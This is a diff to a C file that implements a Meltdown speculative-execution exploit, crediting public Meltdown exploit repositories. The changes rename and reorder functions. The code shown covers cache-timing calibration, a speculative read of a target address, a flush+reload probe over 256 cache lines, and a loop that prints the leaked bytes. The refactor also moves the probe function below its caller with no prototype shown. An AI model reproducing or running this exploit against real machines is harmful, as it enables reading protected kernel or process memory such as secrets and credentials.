@@ -1,8 +1,9 @@
 /*
 In this work I used several people's work
+https://github.com/IAIK/meltdown/blob/master/libkdump.
 https://github.com/paboldin/meltdown-exploit.
- https://github.com/IAIK/meltdown/blob/master/libkdump.
-http://www.hac-ker.net/index/index/showarticle/id/11950.html and https://github.com/21cnbao/meltdown-example.
+http://www.hac-ker.net/index/index/showarticle/id/11950.html 
+https://github.com/21cnbao/meltdown-example.
 */
 #define _GNU_SOURCE
 #define ERROR -1
@@ -61,7 +62,7 @@ static void __attribute__((noinline)) speculate(unsigned long addr){
 }
 
 
-void first_access(volatile char *addr){
+void access_firsttime(volatile char *addr){
 	volatile int j;
 	j= *addr;
 }
@@ -83,19 +84,7 @@ static inline int access_time(volatile char *addr){
 }
 
 
-void check(){
-	int i, time, mix_i;
-	volatile char *addr;
-	for (i = 0; i < 256; i++) {
-		mix_i = ((i * 167) + 13) & 255;
-		addr = &array[mix_i * 4096];
-		time = access_time(addr);
-		if (time <= hit_limit)
-			hist[mix_i]++;
-	}
-}
-
-int readbyte(int fd, unsigned long addr)
+int read_byte(int fd, unsigned long addr)
 {
 	int i, ret = 0, max = -1, maxi = -1;
 	static char buf[256];
@@ -110,7 +99,7 @@ int readbyte(int fd, unsigned long addr)
 		}
 		flush();
 		speculate(addr);
-		check();
+		check_now();
 	}
 
 	for (i = 1; i < 256; i++) {
@@ -124,10 +113,24 @@ int readbyte(int fd, unsigned long addr)
 }
 
 
+
+void check_now(){
+	int i, time, mix_i;
+	volatile char *addr;
+	for (i = 0; i < 256; i++) {
+		mix_i = ((i * 167) + 13) & 255;
+		addr = &array[mix_i * 4096];
+		time = access_time(addr);
+		if (time <= hit_limit)
+			hist[mix_i]++;
+	}
+}
+
+
 static void set_hit_limit(void){
 	long cached, uncached, i;
 	for (i = 0; i < 1000000; i++)
-		first_access(array);
+		access_firsttime(array);
 
 	for (cached = 0, i = 0; i < 1000000; i++)
 		cached += access_time(array);
@@ -167,7 +170,7 @@ int main(int argc, char *argv[])
 
 	printf("Now is the test\n");
 	for (i = 0; i < 8; i++) {
-		ret = readbyte(fd, addr);
+		ret = read_byte(fd, addr);
 		data[i]=ret;
 		printf("data stored at 0x%lx is %x \n",addr, ret);
 		addr++;
